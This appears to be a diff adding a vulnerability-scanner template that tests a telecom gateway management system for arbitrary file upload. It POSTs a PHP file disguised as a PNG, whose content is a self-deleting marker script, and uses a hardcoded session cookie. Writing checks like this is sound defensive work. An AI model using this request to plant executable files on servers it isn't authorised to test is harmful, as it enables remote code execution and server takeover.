@@ -1,0 +1,69 @@
+id: dxwg-upload-upload
+
+info:
+  name: Custom PHP File Upload Vulnerability
+  author: yourname
+  severity: high
+  description: 电信网关配置管理系统某接口处存在任意文件上传,恶意攻击者可以上传恶意软件，例如后门、木马或勒索软件，以获取对服务器的远程访问权限或者破坏系统，对服务器造成极大的安全隐患。
+  reference:
+    - http://example.com/vulnerability-details
+  tags: fileupload,cve,vuln
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/manager/teletext/material/upload.php"
+
+    headers:
+      Cache-Control: "max-age=0"
+      Upgrade-Insecure-Requests: "1"
+      Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
+      Accept-Encoding: "gzip, deflate"
+      Accept-Language: "zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en;q=0.6"
+      Cookie: "PHPSESSID=vsdl33qjn3fbslu7k3r99di5n3"
+      Connection: "close"
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundaryB33cDIYAxIrc9MsS"
+
+    body: |
+      ------WebKitFormBoundaryB33cDIYAxIrc9MsS
+      Content-Disposition: form-data; name="fileToUpload"; filename="dudesuite.php"
+      Content-Type: image/png
+
+      <?php echo "DudeSuite";unlink(__FILE__); ?>
+      ------WebKitFormBoundaryB33cDIYAxIrc9MsS
+      Content-Disposition: form-data; name="type"
+
+      img
+      ------WebKitFormBoundaryB33cDIYAxIrc9MsS
+      Content-Disposition: form-data; name="w"
+
+      1280
+      ------WebKitFormBoundaryB33cDIYAxIrc9MsS
+      Content-Disposition: form-data; name="h"
+
+      720
+      ------WebKitFormBoundaryB33cDIYAxIrc9MsS
+      Content-Disposition: form-data; name="userid"
+
+      1000398
+      ------WebKitFormBoundaryB33cDIYAxIrc9MsS
+      Content-Disposition: form-data; name="appid"
+
+      5
+      ------WebKitFormBoundaryB33cDIYAxIrc9MsS
+      Content-Disposition: form-data; name="uploadtime"
+
+      20230603_231117_1685805077294
+      ------WebKitFormBoundaryB33cDIYAxIrc9MsS--
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - ".php"
+        part: body
+
+      - type: status
+        status:
+          - 200
+
